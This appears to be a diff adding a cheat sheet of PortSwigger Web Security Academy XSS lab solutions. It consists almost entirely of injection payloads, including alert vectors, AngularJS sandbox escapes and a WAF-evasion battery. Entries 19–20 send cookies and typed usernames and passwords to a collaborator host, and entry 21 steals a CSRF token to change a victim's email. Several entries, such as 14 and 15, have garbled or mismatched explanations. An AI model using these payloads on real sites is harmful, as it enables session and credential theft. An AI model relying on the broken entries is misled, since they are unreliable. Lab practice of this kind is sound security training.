@@ -1,0 +1,141 @@
+# PORT SWIGGER XSS ACADEMY - LAB SOLUTIONS (walkthrough style)
+# Replace YOUR-LAB-ID, YOUR-COLLABORATOR-SUBDOMAIN before sending.
+# Mirror of the academy's "Cross-site scripting (XSS)" labs for quick lab practice.
+
+## 1) Reflected XSS into HTML context with nothing encoded
+<script>alert(1)</script>
+
+## 2) Stored XSS into HTML context with nothing encoded
+<script>alert(1)</script>
+# (submit as comment/name and it fires on page load)
+
+## 3) DOM XSS in document.write sink using source location.search
+?search="><svg onload=alert(1)>
+# document.write('<img src="/resources/images/...">')  -> break out with:  "><iframe src=javascript:alert(1)>
+
+## 4) DOM XSS in innerHTML sink using source location.search
+?search=<img src=1 onerror=alert(1)>
+# innerHTML renders HTML but NOT <script>: use image handlers or svg.
+
+## 5) DOM XSS in jQuery anchor href attribute sink using location.search
+?returnPath=javascript:alert(document.cookie)
+# BackLink: jQuery sets href; javascript: pseudo-scheme executes on click.
+
+## 6) DOM XSS in jQuery selector sink using a hashchange event
+# Craft an iframe payload:
+<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#' onload=alert(1) ">
+
+## 7) Reflected XSS into attribute with angle brackets HTML-encoded
+?search=" onmouseover="alert(1)
+# Encoded <> so break the double-quoted attribute instead.
+
+## 8) Stored XSS into anchor href attribute with double quotes HTML-encoded
+javascript:alert(1)
+# submit as website URL in the comment form (href sink).
+
+## 9) Reflected XSS into a JavaScript string with angle brackets HTML encoded
+?search=</script><script>alert(1)</script>
+# single quotes are NOT encoded ->  '-alert(1)-'  also works here.
+
+## 10) XSS in JavaScript context - break out of quoted string
+' ;alert(1)//
+\"-alert(1)}//
+'-alert(1)-'
+
+## 11) XSS in jQuery selector (scroll + click to trigger)
+- "><img src=1 onerror=alert(1)>   (force scroll/focus)
+<...onfocus="alert(1)" tabindex=1 ...>#x
+
+## 12) Reflected XSS with some SVG markup allowed
+?search=<svg><script>alert(1)</script></svg>
+
+## 13) Stored XSS onclick handler (highlight syntax via backticks)
+<button onclick="alert(1)">Click</button>
+
+## 14) Reflected XSS with HTML entities (submit GET body - server parses only first)
+%27x%27onclick=%27alert(1)
+# body=%27x%27onclick=%27alert(1) -> server takes first = reflected with entities decoded only there.
+
+## 15) Reflected XSS in a JavaScript URL with some characters blocked
+javascript:alert(1)
+# </u> breaks closing:  javascript:alert(1)</u>
+
+## 16) XSS using AngularJS expression (no-angle-bracket escape)
+{{$on.constructor('alert(1)')()}}        # primary sandbox escape
+{{$eval.constructor('alert(1)')()}}
+{{alert(1)}}                            # only works on old Chrome builds
+{{constructor.constructor('alert(1)')()}}
+
+## 17) AngularJS sandbox escape in a restricted zone
+{{$on.constructor('alert(1)')()}}
+{{$eval.constructor('alert(1)')()}}
+{{[].pop.constructor('alert(1)')()}}
+
+## 18) Reflected XSS with labels-tag bypass in a template (AngularJS + DOM clobber)
+{{$on.constructor('alert(1)')()}}
+# combined with <xss autofocus tabindex=1 onfocus=alert(1)>
+
+## 19) Blind XSS - capture to your collaborator
+<script>
+fetch('https://YOUR-COLLABORATOR-SUBDOMAIN', {method:'POST',mode:'no-cors',body:document.cookie});
+</script>
+# also try: <script src="//YOUR-COLLABORATOR-SUBDOMAIN/x.js"></script>
+
+## 20) User login credential capture (blind)
+<input name=username id=username>
+<input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-COLLABORATOR-SUBDOMAIN',{method:'POST',mode:'no-cors',body:username.value+':'+this.value});">
+
+## 21) CSRF token steal + session hijack (works on most lab boxes)
+<script>
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('get','/my-account',true);
+req.send();
+function handleResponse() {
+    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('post', '/my-account/change-email', true);
+    changeReq.send('csrf='+token+'&email=test@test.com')
+};
+</script>
+
+## 22) XSS in query params + JSON context (user targeting)
+https://YOUR-LAB-ID.web-security-academy.net/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
+# AngularJS + orderBy amd toString().constructor.fromCharCode(120,61,...) == 'x=alert(1)'
+
+## 23) Classic one-liners that pass most "encoded" labs
+" onmouseover="alert(1)
+<><img src=1 onerror=alert(1)>
+"><img src=1 onerror=alert(1)>
+</script><script>alert(1)</script>
+\'-alert(1)//
+http://foo?&apos;-alert(1)-&apos;
+${alert(1)}
+<img src=x onerror=print()>
+
+## 24) Baseline vector battery (work from here if a filter exists)
+<svg onload=alert(1)>
+<img src=x onerror=alert(1)>
+<body onload=alert(1)>
+<iframe src=javascript:alert(1)>
+<script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+' ;alert(1);//
+<video><source onerror=alert(1)>
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+<select autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+<a href=javascript:alert(1)>click
+<form onsubmit=alert(1)><input type=submit>
+<svg><script>alert(1)</script>
+
+## 25) WAF/normalizer escape kit (still good on messy labs)
+<ScRiPt>alert(1)</ScRiPt>
+<scr<script>ipt>alert(1)</scr<script>ipt>
+%3Cimg%20src=x%20onerror=alert(1)%3E
+\x3cscript\x3ealert(1)\x3c/script\x3e
+<img/src/onerror=alert(1)>
+<svg onload=alert(1)//
+<svg/onload=alert(1)>
+<svg onload=alert`1`>
